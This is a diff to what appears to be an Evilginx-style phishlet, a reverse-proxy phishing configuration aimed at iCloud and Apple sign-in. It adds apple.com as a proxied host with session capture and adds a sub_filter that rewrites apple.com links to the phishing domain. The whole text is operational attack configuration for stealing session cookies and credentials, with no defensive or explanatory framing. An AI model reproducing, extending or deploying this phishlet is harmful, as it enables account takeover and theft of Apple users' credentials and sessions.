@@ -3,6 +3,7 @@ min_ver: '2.3.0'
 
 proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: true, auto_filter: false}
+ - {phish_sub: 'www', orig_sub: 'www', domain: 'apple.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'apple-cloudkit.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'setup', orig_sub: 'setup', domain: 'icloud.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'feedbackws', orig_sub: 'feedbackws', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
@@ -11,6 +12,9 @@ proxy_hosts:
  - {phish_sub: 'gatewayws', orig_sub: 'gatewayws', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
+
+ - {triggers_on: 'www.apple.com', orig_sub: 'www', domain: 'apple.com', search: 'www.apple.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+ 
  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'www.icloud.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'cdn.apple-cloudkit.com', replace: 'cdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'setup.icloud.com', replace: 'setup.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
